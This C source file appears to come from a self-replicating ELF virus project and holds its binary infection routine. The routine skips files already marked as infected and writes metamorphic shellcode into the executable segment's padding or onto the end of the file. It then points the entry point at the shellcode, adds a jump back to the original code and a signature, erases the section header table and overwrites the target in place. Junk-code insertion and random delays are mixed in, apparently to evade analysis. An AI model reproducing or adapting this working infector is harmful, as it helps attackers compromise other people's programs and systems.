#include "../include/war.h"
#include "../include/metamorph_shellcode.h"

// DEBUG: Activar/desactivar prints de debug
#define DEBUG_INJECTOR 1

#if DEBUG_INJECTOR
#define DEBUG_PRINT(fmt, ...) fprintf(stderr, "[DEBUG INJECTOR] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...)
#endif

static int write_infected_file(const char *filepath, void *data, size_t size)
{
	int fd;
	ssize_t written;
	struct stat st;
	mode_t original_mode = 0644;
	if (stat(filepath, &st) == 0)
	{
		original_mode = st.st_mode;
	}
	fd = custom_open(filepath, O_WRONLY | O_TRUNC);
	if (fd < 0)
		return -1;
	written = custom_write(fd, data, size);
	fchmod(fd, original_mode);
	custom_close(fd);
	if (written < 0 || (size_t)written != size)
		return -1;
	return 0;
}

int infect_binary(const char *filepath)
{
	t_elf elf = {0};
	void *new_data = NULL;
	size_t new_size;
	size_t original_size;
	long long save;
	Elf64_Ehdr *new_ehdr;
	Elf64_Phdr *new_phdr;
	Elf64_Shdr *new_shdr;
	int ret = -1;

	DEBUG_PRINT("========== INICIO INFECCION ==========");
	DEBUG_PRINT("Archivo objetivo: %s", filepath);

	save = pepino;
	insert_garbage();
	int order = get_execution_order();
	pepino *= 11;

	if (order == 0 || order == 1)
	{
		if (parse_elf(filepath, &elf) < 0)
			return -1;
		insert_garbage3();
	}
	pepino += 23432;
	if (order == 2 || order == 3)
	{
		if (parse_elf(filepath, &elf) < 0)
			return -1;
		insert_garbage4();
	}
	insert_garbage4();

	if (is_infected(&elf))
	{
		cleanup_elf(&elf);
		return 0;
	}
	random_delay();

	original_size = elf.size;
	uint64_t original_entry = elf.ehdr->e_entry;

	DEBUG_PRINT("--- INFO ELF ORIGINAL ---");
	DEBUG_PRINT("  Tamaño original: %zu bytes", original_size);
	DEBUG_PRINT("  Entry point original: 0x%lx", (unsigned long)original_entry);
	DEBUG_PRINT("  e_phoff: 0x%lx", (unsigned long)elf.ehdr->e_phoff);
	DEBUG_PRINT("  e_shoff: 0x%lx", (unsigned long)elf.ehdr->e_shoff);
	DEBUG_PRINT("  e_phnum: %d", elf.ehdr->e_phnum);
	DEBUG_PRINT("  e_shnum: %d", elf.ehdr->e_shnum);
	DEBUG_PRINT("  Tipo ELF: %d (ET_EXEC=2, ET_DYN=3)", elf.ehdr->e_type);

	// Find the executable PT_LOAD segment (TEXT) - mejor para inyección porque no tiene .bss
	Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)elf.data + elf.ehdr->e_phoff);
	Elf64_Phdr *text_seg = NULL;
	size_t text_seg_idx = 0;

	DEBUG_PRINT("--- ANALISIS SEGMENTOS PT_LOAD ---");
	for (int i = 0; i < elf.ehdr->e_phnum; i++)
	{
		if (phdr[i].p_type == PT_LOAD)
		{
			DEBUG_PRINT("  PT_LOAD[%d]: vaddr=0x%lx paddr=0x%lx offset=0x%lx filesz=0x%lx memsz=0x%lx flags=0x%x align=0x%lx",
				i,
				(unsigned long)phdr[i].p_vaddr,
				(unsigned long)phdr[i].p_paddr,
				(unsigned long)phdr[i].p_offset,
				(unsigned long)phdr[i].p_filesz,
				(unsigned long)phdr[i].p_memsz,
				phdr[i].p_flags,
				(unsigned long)phdr[i].p_align);
			
			// Buscar el segmento ejecutable (TEXT) - tiene flag PF_X y filesz == memsz
			if ((phdr[i].p_flags & PF_X) && phdr[i].p_filesz == phdr[i].p_memsz)
			{
				text_seg = &phdr[i];
				text_seg_idx = i;
				DEBUG_PRINT("    -> SEGMENTO TEXT ENCONTRADO (ejecutable, sin .bss)");
			}
		}
	}

	if (!text_seg)
	{
		DEBUG_PRINT("ERROR: No se encontro segmento TEXT ejecutable!");
		cleanup_elf(&elf);
		return -1;
	}

	DEBUG_PRINT("--- SEGMENTO TEXT SELECCIONADO PARA INYECCION ---");
	DEBUG_PRINT("  Indice: %zu", text_seg_idx);
	DEBUG_PRINT("  p_vaddr: 0x%lx", (unsigned long)text_seg->p_vaddr);
	DEBUG_PRINT("  p_memsz: 0x%lx", (unsigned long)text_seg->p_memsz);
	DEBUG_PRINT("  p_filesz: 0x%lx", (unsigned long)text_seg->p_filesz);
	DEBUG_PRINT("  p_offset: 0x%lx", (unsigned long)text_seg->p_offset);
	DEBUG_PRINT("  p_flags: 0x%x (debe tener PF_X=1)", text_seg->p_flags);

	// Calcular el padding disponible después del segmento TEXT
	size_t segment_file_end = text_seg->p_offset + text_seg->p_filesz;
	
	// Buscar el siguiente segmento para calcular el padding disponible
	size_t next_seg_offset = original_size; // Por defecto, fin del archivo
	for (int i = 0; i < elf.ehdr->e_phnum; i++) {
		if (phdr[i].p_offset > segment_file_end && phdr[i].p_offset < next_seg_offset) {
			next_seg_offset = phdr[i].p_offset;
		}
	}
	
	size_t available_padding = next_seg_offset - segment_file_end;
	DEBUG_PRINT("  Padding disponible: %zu bytes (de 0x%lx a 0x%lx)",
		available_padding, (unsigned long)segment_file_end, (unsigned long)next_seg_offset);

	// El payload va al final del segmento TEXT, usando el padding existente
	size_t payload_file_offset = segment_file_end;
	
	// Para TEXT, filesz == memsz, así que la relación vaddr-offset es simple
	uint64_t vaddr_offset_diff = text_seg->p_vaddr - text_seg->p_offset;
	uint64_t payload_vaddr = payload_file_offset + vaddr_offset_diff;

	DEBUG_PRINT("--- CALCULO PAYLOAD VADDR (USANDO PADDING) ---");
	DEBUG_PRINT("  segment_file_end: 0x%lx", (unsigned long)segment_file_end);
	DEBUG_PRINT("  payload_file_offset: 0x%lx", (unsigned long)payload_file_offset);
	DEBUG_PRINT("  vaddr_offset_diff: 0x%lx", (unsigned long)vaddr_offset_diff);
	DEBUG_PRINT("  payload_vaddr: 0x%lx", (unsigned long)payload_vaddr);
	DEBUG_PRINT("  METAMORPH_SHELLCODE_SIZE: %d bytes", METAMORPH_SHELLCODE_SIZE);

	// Generate jump to original entry point
	unsigned char jmp_to_original[14];
	size_t jmp_size;

	uint64_t jmp_from = payload_vaddr + METAMORPH_SHELLCODE_SIZE;
	uint64_t jmp_to = original_entry;
	int64_t rel_offset = (int64_t)(jmp_to - (jmp_from + 5));

	DEBUG_PRINT("--- CALCULO SALTO A ENTRY ORIGINAL ---");
	DEBUG_PRINT("  jmp_from (payload_vaddr + shellcode_size) = 0x%lx + %d = 0x%lx",
		(unsigned long)payload_vaddr, METAMORPH_SHELLCODE_SIZE, (unsigned long)jmp_from);
	DEBUG_PRINT("  jmp_to (original_entry) = 0x%lx", (unsigned long)jmp_to);
	DEBUG_PRINT("  rel_offset = jmp_to - (jmp_from + 5) = 0x%lx - 0x%lx = %ld (0x%lx)",
		(unsigned long)jmp_to, (unsigned long)(jmp_from + 5), (long)rel_offset, (unsigned long)rel_offset);

	if (rel_offset >= INT32_MIN && rel_offset <= INT32_MAX)
	{
		jmp_to_original[0] = 0xE9;
		*(int32_t *)(&jmp_to_original[1]) = (int32_t)rel_offset;
		jmp_size = 5;
		DEBUG_PRINT("  Usando JMP relativo (E9): offset=%d (0x%x), size=%zu",
			(int32_t)rel_offset, (uint32_t)(int32_t)rel_offset, jmp_size);
	}
	else
	{
		jmp_to_original[0] = 0xFF;
		jmp_to_original[1] = 0x25;
		*(uint32_t *)(&jmp_to_original[2]) = 0;
		*(uint64_t *)(&jmp_to_original[6]) = jmp_to;
		jmp_size = 14;
		DEBUG_PRINT("  Usando JMP indirecto absoluto (FF 25): target=0x%lx, size=%zu",
			(unsigned long)jmp_to, jmp_size);
	}

	DEBUG_PRINT("  Bytes del JMP generado:");
	fprintf(stderr, "[DEBUG INJECTOR]   ");
	for (size_t i = 0; i < jmp_size; i++)
		fprintf(stderr, "%02x ", jmp_to_original[i]);
	fprintf(stderr, "\n");

	// Get signature for injection (texto plano, visible con strings)
	const char *sig = get_signature();
	size_t sig_len = strlen(sig) + 1;

	DEBUG_PRINT("--- SIGNATURE ---");
	DEBUG_PRINT("  Signature: '%s'", sig);
	DEBUG_PRINT("  sig_len (con null): %zu", sig_len);

	// Calculate total injection size: shellcode + jump + signature
	size_t total_injection_size = METAMORPH_SHELLCODE_SIZE + jmp_size + sig_len;

	DEBUG_PRINT("--- TAMAÑOS DE INYECCION ---");
	DEBUG_PRINT("  METAMORPH_SHELLCODE_SIZE: %d", METAMORPH_SHELLCODE_SIZE);
	DEBUG_PRINT("  jmp_size: %zu", jmp_size);
	DEBUG_PRINT("  sig_len: %zu", sig_len);
	DEBUG_PRINT("  total_injection_size: %zu", total_injection_size);
	DEBUG_PRINT("  available_padding: %zu", available_padding);

	// Decidir estrategia: padding o extender archivo
	int use_padding = (total_injection_size <= available_padding);
	
	if (use_padding) {
		DEBUG_PRINT("  ESTRATEGIA: Usar padding existente");
		new_size = original_size;
	} else {
		DEBUG_PRINT("  ESTRATEGIA: Extender archivo al final");
		// Inyectar al final del archivo, extendiendo el segmento TEXT
		payload_file_offset = original_size;
		payload_vaddr = payload_file_offset + vaddr_offset_diff;
		new_size = original_size + total_injection_size;
		
		// Recalcular JMP con nueva posición
		jmp_from = payload_vaddr + METAMORPH_SHELLCODE_SIZE;
		rel_offset = (int64_t)(jmp_to - (jmp_from + 5));
		
		if (rel_offset >= INT32_MIN && rel_offset <= INT32_MAX) {
			jmp_to_original[0] = 0xE9;
			*(int32_t *)(&jmp_to_original[1]) = (int32_t)rel_offset;
			jmp_size = 5;
		} else {
			jmp_to_original[0] = 0xFF;
			jmp_to_original[1] = 0x25;
			*(uint32_t *)(&jmp_to_original[2]) = 0;
			*(uint64_t *)(&jmp_to_original[6]) = jmp_to;
			jmp_size = 14;
		}
		
		DEBUG_PRINT("  Nuevo payload_file_offset: 0x%lx", (unsigned long)payload_file_offset);
		DEBUG_PRINT("  Nuevo payload_vaddr: 0x%lx", (unsigned long)payload_vaddr);
	}
	
	DEBUG_PRINT("  payload_file_offset: 0x%lx", (unsigned long)payload_file_offset);
	DEBUG_PRINT("  new_size: %zu", new_size);

	new_data = malloc(new_size);
	if (!new_data)
	{
		DEBUG_PRINT("ERROR: malloc fallo para new_size=%zu", new_size);
		cleanup_elf(&elf);
		return -1;
	}

	insert_garbage5();

	// Copiar archivo original
	memcpy(new_data, elf.data, original_size);
	DEBUG_PRINT("Copiado archivo original (%zu bytes)", original_size);

	// Escribir shellcode en la posición calculada
	memcpy((char *)new_data + payload_file_offset, metamorph_shellcode, METAMORPH_SHELLCODE_SIZE);
	DEBUG_PRINT("Escrito shellcode (%d bytes) en offset 0x%lx",
		METAMORPH_SHELLCODE_SIZE, (unsigned long)payload_file_offset);

	// PARCHE: Reemplazar el último byte del shellcode (ret = 0xc3) con NOP (0x90)
	unsigned char *shellcode_end = (unsigned char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE - 1;
	if (*shellcode_end == 0xc3) {
		*shellcode_end = 0x90;
		DEBUG_PRINT("Parcheado: ret (0xc3) -> nop (0x90)");
	}

	// Escribir JMP
	memcpy((char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE, jmp_to_original, jmp_size);
	DEBUG_PRINT("Escrito JMP (%zu bytes) en offset 0x%lx",
		jmp_size, (unsigned long)(payload_file_offset + METAMORPH_SHELLCODE_SIZE));

	// Sobrescribir con signature
	memcpy((char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE + jmp_size, sig, sig_len);
	DEBUG_PRINT("Sobrescrito con signature (%zu bytes) en offset 0x%lx",
		sig_len, (unsigned long)(payload_file_offset + METAMORPH_SHELLCODE_SIZE + jmp_size));

	cleanup_elf(&elf);

	// Modify headers
	new_ehdr = (Elf64_Ehdr *)new_data;
	new_phdr = (Elf64_Phdr *)((char *)new_data + new_ehdr->e_phoff);
	// new_shdr ya no se usa porque invalidamos la section table
	(void)new_shdr; // Evitar warning de variable no usada

	DEBUG_PRINT("--- MODIFICACION DE HEADERS ---");
	DEBUG_PRINT("  Entry point ANTES: 0x%lx", (unsigned long)new_ehdr->e_entry);

	// Change entry point to shellcode (+ offset de la función principal)
	uint64_t shellcode_entry = payload_vaddr + METAMORPH_ENTRY_OFFSET;
	new_ehdr->e_entry = shellcode_entry;
	DEBUG_PRINT("  METAMORPH_ENTRY_OFFSET: %d", METAMORPH_ENTRY_OFFSET);
	DEBUG_PRINT("  Entry point DESPUES: 0x%lx (payload_vaddr + offset)", (unsigned long)new_ehdr->e_entry);

	DEBUG_PRINT("  Segmento[%zu] ANTES de extension: filesz=0x%lx memsz=0x%lx flags=0x%x",
		text_seg_idx,
		(unsigned long)new_phdr[text_seg_idx].p_filesz,
		(unsigned long)new_phdr[text_seg_idx].p_memsz,
		new_phdr[text_seg_idx].p_flags);

	// Extender filesz y memsz del segmento TEXT para incluir el payload
	if (use_padding) {
		// Solo extendemos por el tamaño de la inyección dentro del padding
		new_phdr[text_seg_idx].p_filesz += total_injection_size;
		new_phdr[text_seg_idx].p_memsz += total_injection_size;
	} else {
		// Extendemos hasta el final del archivo (incluyendo lo que había después del segmento)
		// Usamos new_phdr porque text_seg apuntaba a memoria ya liberada
		size_t extension = (payload_file_offset + total_injection_size) - 
		                   (new_phdr[text_seg_idx].p_offset + new_phdr[text_seg_idx].p_filesz);
		new_phdr[text_seg_idx].p_filesz += extension;
		new_phdr[text_seg_idx].p_memsz += extension;
		DEBUG_PRINT("  Extension del segmento: %zu bytes", extension);
	}

	// TEXT ya es ejecutable, pero verificamos por si acaso
	if (!(new_phdr[text_seg_idx].p_flags & PF_X))
	{
		DEBUG_PRINT("  WARNING: Segmento TEXT no era ejecutable!");
		new_phdr[text_seg_idx].p_flags |= PF_X;
	}

	DEBUG_PRINT("  Segmento[%zu] DESPUES de extension: filesz=0x%lx memsz=0x%lx flags=0x%x",
		text_seg_idx,
		(unsigned long)new_phdr[text_seg_idx].p_filesz,
		(unsigned long)new_phdr[text_seg_idx].p_memsz,
		new_phdr[text_seg_idx].p_flags);

	// IMPORTANTE: Invalidar section header table para evitar confusión del loader
	// El binario no necesita las secciones para ejecutarse, solo los program headers
	DEBUG_PRINT("--- INVALIDANDO SECTION HEADER TABLE ---");
	DEBUG_PRINT("  e_shoff ANTES: 0x%lx, e_shnum ANTES: %d", 
		(unsigned long)new_ehdr->e_shoff, new_ehdr->e_shnum);
	new_ehdr->e_shoff = 0;
	new_ehdr->e_shnum = 0;
	new_ehdr->e_shstrndx = 0;
	DEBUG_PRINT("  e_shoff DESPUES: 0, e_shnum DESPUES: 0 (section table invalidada)");

	// Ya no necesitamos extender la última sección porque la tabla está invalidada
	DEBUG_PRINT("--- BUSQUEDA ULTIMA SECCION (SKIP - tabla invalidada) ---");

	// Ya no modificamos secciones porque invalidamos la tabla
	// El siguiente bloque está comentado pero lo dejamos como referencia
	/*
	int last_section = -1;
	size_t max_offset = 0;
	for (int i = 0; i < new_ehdr->e_shnum; i++)
	{
		size_t section_end = new_shdr[i].sh_offset + new_shdr[i].sh_size;
		if (section_end > max_offset && section_end <= original_size)
		{
			max_offset = section_end;
			last_section = i;
		}
	}
	if (last_section >= 0)
		new_shdr[last_section].sh_size += total_injection_size;
	*/

	insert_garbage5();

	DEBUG_PRINT("========== RESUMEN FINAL ==========");
	DEBUG_PRINT("  Tamaño archivo original: %zu", original_size);
	DEBUG_PRINT("  Tamaño archivo nuevo: %zu", new_size);
	DEBUG_PRINT("  Entry point original: 0x%lx", (unsigned long)original_entry);
	DEBUG_PRINT("  Entry point nuevo (shellcode): 0x%lx", (unsigned long)payload_vaddr);
	DEBUG_PRINT("  Offset shellcode en archivo: 0x%lx", (unsigned long)payload_file_offset);
	DEBUG_PRINT("  Vaddr shellcode: 0x%lx", (unsigned long)payload_vaddr);
	DEBUG_PRINT("  Vaddr fin shellcode: 0x%lx", (unsigned long)(payload_vaddr + METAMORPH_SHELLCODE_SIZE));
	DEBUG_PRINT("  Vaddr JMP: 0x%lx", (unsigned long)(payload_vaddr + METAMORPH_SHELLCODE_SIZE));
	DEBUG_PRINT("  Destino JMP: 0x%lx", (unsigned long)original_entry);
	DEBUG_PRINT("===================================");

	ret = write_infected_file(filepath, new_data, new_size);
	DEBUG_PRINT("write_infected_file retorno: %d", ret);
	free(new_data);

	pepino = save;
	pepino *= 1;
	return ret;
}